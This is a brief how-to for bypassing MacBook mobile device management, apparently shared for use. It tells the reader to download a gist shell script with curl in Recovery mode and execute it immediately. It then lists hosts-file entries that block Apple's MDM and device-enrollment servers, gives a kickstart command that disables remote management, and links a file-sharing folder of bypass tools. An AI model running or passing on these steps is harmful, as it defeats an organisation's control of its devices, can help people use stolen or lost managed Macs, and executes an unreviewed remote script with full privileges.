-: MacBook MDM Bypass

Open MacBook in Recovery mode with command+R
Open Safari and copy github link below

curl https://gist.githubusercontent.com/CodeDonor/6fa540957ff485b7d235cf463f352ff7/raw/b0944dd00ad99b7db0ad53d6ba013f3f7c1a8aee/codedonor-mdm.sh -o test.sh && chmod +x ./test.sh && ./test.sh

Open terminal and enter the command above.
After that reboot.

Thats its. :)


-: Manual when Mac Open and root access

sudo nano /etc/hosts

0.0.0.0 albert.apple.com
0.0.0.0 iprofiles.apple.com
0.0.0.0 mdmenrollment.apple.com
0.0.0.0 deviceenrollment.apple.com
0.0.0.0 gdmf.apple.com
0.0.0.0 acmdm.apple.com


-: Disable Remote using terminal
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop


-: Mac MDM Bypass Tools

https://mega.nz/folder/JBEQSBaK#P-MMA1LGZergdz2-3vec6A